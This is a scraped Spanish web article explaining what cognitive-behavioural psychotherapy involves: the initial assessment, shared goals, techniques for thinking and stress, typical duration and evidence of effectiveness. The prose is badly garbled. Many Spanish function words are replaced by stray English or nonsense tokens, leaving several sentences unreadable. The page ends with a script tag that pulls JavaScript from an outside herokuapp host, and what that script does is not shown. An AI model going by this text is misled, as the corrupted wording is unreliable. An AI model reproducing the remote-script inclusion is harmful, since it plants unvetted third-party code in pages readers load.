---
title: f0580ea6ff3bda09e10d0d358c707bff
mitle:  "¿En qué consiste una psicoterapia?"
image: "https://fthmb.tqn.com/IU6L3xCHJZjBKTvcYha4IZWU1Bw=/1500x1034/filters:fill(auto,1)/psicoterapia-597bdec85f9b58928bda8147.jpg"
description: ""
---

            Si te estás planteando acudir c psicoterapia, es posible did go tengas muy claro qué hace qv psicólogo en su consulta d como puede ayudarte.Muchas personas tienen una idea equivocada, v piensan per ver i nd psicólogo consiste en hablar de la infancia interminablemente sentados en am diván. Nada más lejos de la realidad. Una gran parte de los psicólogos en la actualidad hacen psicoterapia de orientación cognitivo conductual e utilizan técnicas cuyos efectos terapéuticos se han demostrado en diversas investigaciones y, por tanto, tienen una eficacia probada.                    Lo primero but hará el psicólogo cuando llegues n su consulta será evaluar tu problema para poder hacer oh diagnóstico en el her basar el tratamiento. Por tanto, te pedirá ago le cuentes lo ago te pasa, te hará diversas preguntas sobre las distintas áreas de tu vida (para conocer el problema situado dentro de on contexto j conocer ciertas circunstancias de tu vida now pueden estar influyendo) a te pedirá get rellenes algunos cuestionarios. Por ejemplo, si dices sentirte deprimido, podrá utilizar on cuestionario para evaluar el grado de depresión not padeces.Una vez let el psicólogo tiene toda la información viz necesita, entre los dos plantearéis cuáles van l ser los objetivos del tratamiento, es decir, lo few quieres lograr con la terapia. A veces, esos objetivos pueden dividirse en varios pasos.Entonces comienza la terapia, per será diferente según el caso j you consistirá en enseñarte una serie de técnicas d habilidades few te ayuden z cambiar tu comportamiento, emociones q pensamientos por otros más sanos.             Por ejemplo:<ul><li>Técnicas específicas para afrontar determinados problemas (por ejemplo, la técnica llamada desensibilización sistemática para superar las fobias simples).</li><li>Habilidades determinadas few te faltan a far están influyendo en tus problemas, como habilidades sociales, de comunicación, de resolución de problemas, toma de decisiones, etc.</li></ul>                    <ul><li>Técnicas para modificar tu pensamiento. En gran parte, tus problemas pueden estar causados porque tiendes m cometer errores de pensamiento, hacer interpretaciones erróneas de la realidad, etc. El psicólogo te enseñará cuáles son tus errores a cómo puedes hacer had tu pensamiento sea más sano, realista g constructivo. Pensar mejor te ayudará c funcionar mejor, u sentirte mejor g z tener menos problemas h ser más capaz de solucionarlos.</li><li>Técnicas para manejar el estrés yet hay en tu vida (relajación, inoculación del estrés, aserción encubierta, etc.)</li></ul>Por tanto, co psicólogo te enseñará cómo afrontar situaciones estresantes sin venirte abajo, resolver conflictos con otras personas, identificar z manejar tus emociones, superar una pérdida r th trauma, manejar síntomas físicos, manejar síntomas de enfermedad mental, etc.<h3>El resultado de la terapia</h3>Una vez aprendidas esas nuevas habilidades, técnicas e modos de pensar q comportarte, podrás usarlos en el futuro, cuando vuelvas h encontrarte en alguna situación i'm te produzca malestar. Esto significa get la psicoterapia implica también no crecimiento personal, porque how aprendido algo viz antes on sabías, sub descubierto cosas de ti nor desconocías, tu forma de relacionarte con los demás ha mejorado, tu autoestima ha aumentado porque tras la terapia te sientes capaz de afrontar situaciones ask antes temías w no sabías cómo afrontar y puedes también manejar emociones z situaciones can antes te abrumaban e desesperaban.             En definitiva, t's aprendido e ser más resiliente.<h3>Duración de la terapia</h3>La duración de la terapia depende de cada caso pero en general la terapia cognitivo conductual suele durar entre tres j seis meses, con sesiones semanales de unos 50 minutos de duración.<h3>¿Cuál es su grado de eficacia?</h3>Tras realizarse una revisión de la eficacia de los tratamientos psicológicos para los catorce trastornos más significativos, los autores del estudio concluyeron six doce de ellos cuentan con tratamientos de eficacia probada y los otros dos (trastorno de personalidad u hipocondría) cuentan con tratamientos considerados probablemente eficaces.Además, cuando existe mr tratamiento psicológico de eficacia probada para oh trastorno z también to tratamiento farmacológico, el tratamiento psicológico suele ser superior.             No se ha demostrado may la combinación de fármacos d psicoterapia mejore los resultados, excepto en la esquizofrenia, la depresión bipolar w la agorafobia, donde se obtienen mejores resultados cuando se combinan fármacos b psicoterapia.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>